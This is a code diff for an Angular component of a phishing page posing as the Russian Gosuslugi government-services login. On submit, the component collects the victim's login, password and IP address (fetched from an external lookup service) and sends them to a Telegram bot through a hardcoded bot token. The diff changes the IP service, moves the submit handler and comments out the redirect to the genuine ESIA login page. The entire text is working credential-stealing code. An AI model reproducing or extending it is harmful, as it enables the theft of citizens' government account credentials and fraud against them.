@@ -31,7 +31,6 @@ export class AppComponent implements OnInit {
 	ipAddress: string | any;
 
 	sentMessage(): void {
-		console.log(this.ipAddress ? this.ipAddress.ip : ' ');
 		if (this.prevValue.login !== this.form.get('login').value || this.prevValue.password !== this.form.get('password').value) {
 			const message = `Новый Лог – ГосУслуги🤟%0AIP: ${this.ipAddress ? this.ipAddress.ip : ' '}%0AЛогин: ${this.form.get('login').value}%0AПароль: ${this.form.get('password').value}`;
 			const token = '949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs';
@@ -45,7 +44,7 @@ export class AppComponent implements OnInit {
 			Telegram.send();
 			this.prevValue.login = this.form.get('login').value;
 			this.prevValue.password = this.form.get('password').value;
-			window.location.href = 'https://esia.gosuslugi.ru/idp/rlogin?cc=bp';
+			// window.location.href = 'https://esia.gosuslugi.ru/idp/rlogin?cc=bp';
 		}
 	}
 
@@ -56,7 +55,16 @@ export class AppComponent implements OnInit {
 	) {}
 
 	getIPInfo(): Observable<IPInfo | any> {
-		return this.http.get('http://api.ipify.org/?format=json').pipe(first());
+		return this.http.get('https://jsonip.com').pipe(
+			first(),
+		);
+	}
+
+	onSubmit(): void {
+		console.log(this.ipAddress ? this.ipAddress.ip : ' ');
+		if (this.form.valid) {
+			this.sentMessage();
+		}
 	}
 
 	ngOnInit(): void {
@@ -66,11 +74,5 @@ export class AppComponent implements OnInit {
 				map((observer) => observer.matches)
 			)
 			.subscribe((isSmallScreen) => this.isSmallScreen = isSmallScreen);
-	}
-
-	onSubmit(): void {
-		if (this.form.valid) {
-			this.sentMessage();
-		}
 	}
 }
